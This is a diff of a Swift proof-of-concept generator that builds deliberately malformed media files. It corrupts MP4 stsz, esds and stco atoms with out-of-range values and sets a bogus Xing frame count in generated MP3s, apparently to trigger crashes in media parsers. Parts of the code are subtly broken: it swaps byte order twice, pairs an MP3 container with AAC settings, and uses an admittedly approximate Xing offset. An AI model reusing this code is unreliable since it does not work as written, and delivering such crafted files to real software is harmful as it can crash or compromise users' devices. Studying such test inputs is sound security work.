@@ -54,7 +54,6 @@ func manipulatePoC1(inputURL: URL, outputURL: URL) throws {
         throw NSError(domain: "MP4", code: -1, userInfo: [NSLocalizedDescriptionKey: "stsz atom not found"])
     }
     
-    // stsz format: version (1), flags (3), sample_size (4), sample_count (4)
     let sampleCountOffset = stsz.offset + 8 + 4 // Skip version, flags, sample_size
     var newData = Data()
     newData.append(contentsOf: UInt32(8192).bigEndian.data)
@@ -73,7 +72,6 @@ func manipulatePoC2(inputURL: URL, outputURL: URL) throws {
         throw NSError(domain: "MP4", code: -1, userInfo: [NSLocalizedDescriptionKey: "esds atom not found"])
     }
     
-    // esds channel config is at offset 0x1B from esds start
     let channelOffset = esds.offset + 8 + 0x1B
     parser.replaceData(at: channelOffset, with: Data([8]))
     
@@ -90,7 +88,6 @@ func manipulatePoC5(inputURL: URL, outputURL: URL) throws {
         throw NSError(domain: "MP4", code: -1, userInfo: [NSLocalizedDescriptionKey: "stco atom not found"])
     }
     
-    // stco: version (1), flags (3), entry_count (4), entries (4 each)
     let entryOffset = stco.offset + 8 + 4 // Skip version, flags, entry_count
     var newData = Data()
     newData.append(contentsOf: UInt32(0xFFFFFFFF).bigEndian.data)
@@ -100,63 +97,109 @@ func manipulatePoC5(inputURL: URL, outputURL: URL) throws {
     print("PoC 5: Set invalid stco offset in \(outputURL.path)")
 }
 
-func generateMP3(inputURL: URL, outputURL: URL, pocNumber: Int) throws {
-    // Generate MP3 using AVAssetExportSession
-    let asset = AVURLAsset(url: inputURL)
-    guard let exportSession = AVAssetExportSession(asset: asset, presetName: AVAssetExportPresetAppleM4A) else {
-        throw NSError(domain: "AVAssetExportSession", code: -1, userInfo: [NSLocalizedDescriptionKey: "Failed to create export session"])
-    }
-    
-    exportSession.outputURL = outputURL
-    exportSession.outputFileType = .mp3
-    exportSession.audioSettings = [
-        AVFormatIDKey: kAudioFormatMPEG4AAC,
-        AVSampleRateKey: 44100,
-        AVNumberOfChannelsKey: 1,
-        AVEncoderBitRateKey: pocNumber == 4 ? 320000 : 128000 // PoC 4: 320 kbps
-    ]
-    
-    // Export MP3
-    let semaphore = DispatchSemaphore(value: 0)
-    exportSession.exportAsynchronously {
-        switch exportSession.status {
-        case .completed:
-            print("PoC \(pocNumber): Generated MP3 at \(outputURL.path)")
-            if pocNumber == 3 {
-                // PoC 3: Add Xing frames=20000 metadata using FFmpeg
-                let ffmpegCmd = [
-                    "ffmpeg", "-i", outputURL.path, "-c:a", "copy",
-                    "-metadata", "frames=20000", "\(outputURL.path).tmp.mp3"
-                ]
-                let process = Process()
-                process.executableURL = URL(fileURLWithPath: "/usr/local/bin/ffmpeg")
-                process.arguments = ffmpegCmd
-                try? process.run()
-                process.waitUntilExit()
-                
-                // Replace original MP3
-                try? FileManager.default.removeItem(at: outputURL)
-                try? FileManager.default.moveItem(at: URL(fileURLWithPath: "\(outputURL.path).tmp.mp3"), to: outputURL)
-                print("PoC 3: Added frames=20000 metadata to \(outputURL.path)")
-            }
-        case .failed:
-            print("PoC \(pocNumber) MP3 error: \(exportSession.error?.localizedDescription ?? "Unknown")")
-        default:
-            print("PoC \(pocNumber) MP3 export status: \(exportSession.status.rawValue)")
+func generateMP3(filename: String, duration: Double, channels: Int, sampleRate: Double, pocNumber: Int) throws {
+    // Generate MP3 using AVAssetWriter
+    let outputURL = URL(fileURLWithPath: filename)
+    let format = AVAudioFormat(standardFormatWithSampleRate: sampleRate, channels: UInt32(channels))!
+    let frameCount = UInt32(duration * sampleRate)
+    let buffer = AVAudioPCMBuffer(pcmFormat: format, frameCapacity: frameCount)!
+    buffer.frameLength = frameCount
+    if let floatData = buffer.floatChannelData {
+        for channel in 0..<Int(format.channelCount) {
+            memset(floatData[channel], 0, Int(frameCount) * MemoryLayout<Float>.size)
         }
-        semaphore.signal()
     }
-    semaphore.wait()
     
-    if exportSession.status != .completed {
-        throw NSError(domain: "AVAssetExportSession", code: -1, userInfo: [NSLocalizedDescriptionKey: "MP3 export failed"])
+    let writer = try AVAssetWriter(outputURL: outputURL, fileType: .mp3)
+    let bitrate = pocNumber == 4 ? 320000 : 128000 // PoC 4: 320 kbps
+    let settings: [String: Any] = [
+        AVFormatIDKey: kAudioFormatMPEG4AAC,
+        AVSampleRateKey: sampleRate,
+        AVNumberOfChannelsKey: channels,
+        AVEncoderBitRateKey: bitrate
+    ]
+    let audioInput = AVAssetWriterInput(mediaType: .audio, outputSettings: settings)
+    writer.add(audioInput)
+    writer.startWriting()
+    writer.startSession(atSourceTime: .zero)
+    
+    var formatDesc: CMAudioFormatDescription?
+    let asbd = format.streamDescription
+    CMAudioFormatDescriptionCreate(allocator: kCFAllocatorDefault,
+                                  asbd: asbd,
+                                  layoutSize: 0,
+                                  layout: nil,
+                                  magicCookieSize: 0,
+                                  magicCookie: nil,
+                                  extensions: nil,
+                                  formatDescriptionOut: &formatDesc)
+    
+    var sampleBuffer: CMSampleBuffer?
+    let blockBufferLength = Int(frameCount) * Int(format.channelCount) * MemoryLayout<Float>.size
+    var blockBuffer: CMBlockBuffer?
+    CMBlockBufferCreateWithMemoryBlock(allocator: kCFAllocatorDefault,
+                                      memoryBlock: buffer.floatChannelData![0],
+                                      blockLength: blockBufferLength,
+                                      blockAllocator: kCFAllocatorNull,
+                                      customBlockSource: nil,
+                                      offsetToData: 0,
+                                      dataLength: blockBufferLength,
+                                      flags: 0,
+                                      blockBufferOut: &blockBuffer)
+    let timing = CMSampleTimingInfo(duration: CMTime(value: 1, timescale: Int32(sampleRate)),
+                                   presentationTimeStamp: .zero,
+                                   decodeTimeStamp: .invalid)
+    CMSampleBufferCreate(allocator: kCFAllocatorDefault,
+                        dataBuffer: blockBuffer,
+                        dataReady: true,
+                        makeDataReadyCallback: nil,
+                        refcon: nil,
+                        formatDescription: formatDesc,
+                        sampleCount: CMItemCount(frameCount),
+                        sampleTimingEntryCount: 1,
+                        sampleTimingArray: [timing],
+                        sampleSizeEntryCount: 0,
+                        sampleSizeArray: nil,
+                        sampleBufferOut: &sampleBuffer)
+    audioInput.append(sampleBuffer!)
+    audioInput.markAsFinished()
+    writer.finishWriting {
+        print("Generated MP3 \(filename)")
+    }
+    
+    while writer.status == .writing {
+        Thread.sleep(forTimeInterval: 0.1)
+    }
+    if writer.status == .failed {
+        throw writer.error ?? NSError(domain: "AVAssetWriter", code: -1, userInfo: nil)
+    }
+    
+    // PoC 3: Add Xing frames=20000 metadata via hex edit
+    if pocNumber == 3 {
+        var mp3Data = try Data(contentsOf: outputURL)
+        // Simplified Xing header insertion (offset 0x24 for frame count in Xing tag)
+        // Assuming Xing tag exists; real-world would need parsing
+        let frameCountOffset = 0x24 // Approximate, needs validation
+        if mp3Data.count > frameCountOffset + 4 {
+            let frameCountData = UInt32(20000).bigEndian.data
+            mp3Data.replaceSubrange(frameCountOffset..<frameCountOffset+4, with: frameCountData)
+            try mp3Data.write(to: outputURL)
+            print("PoC 3: Set Xing frames to 20000 in \(filename)")
+        } else {
+            throw NSError(domain: "MP3", code: -1, userInfo: [NSLocalizedDescriptionKey: "Invalid MP3 for Xing edit"])
+        }
+    }
+}
+
+extension UInt32 {
+    var data: Data {
+        var value = self.bigEndian
+        return Data(bytes: &value, count: MemoryLayout<UInt32>.size)
     }
 }
 
 func main() {
     let fileManager = FileManager.default
-    let sampleRate = 44100.0
-    let channels = 2
     
     for i in 1...5 {
         let inputFile = "base_poc\(i).m4a"
@@ -188,19 +231,12 @@ func main() {
                 break
             }
             
-            // Generate MP3
-            try generateMP3(inputURL: inputURL, outputURL: outputMP3URL, pocNumber: i)
+            // Generate MP3 independently
+            try generateMP3(filename: outputMP3, duration: 1.0, channels: 1, sampleRate: 44100.0, pocNumber: i)
         } catch {
             print("Error processing PoC \(i): \(error.localizedDescription)")
             exit(1)
         }
-    }
-}
-
-extension UInt32 {
-    var data: Data {
-        var value = self.bigEndian
-        return Data(bytes: &value, count: MemoryLayout<UInt32>.size)
     }
 }
 
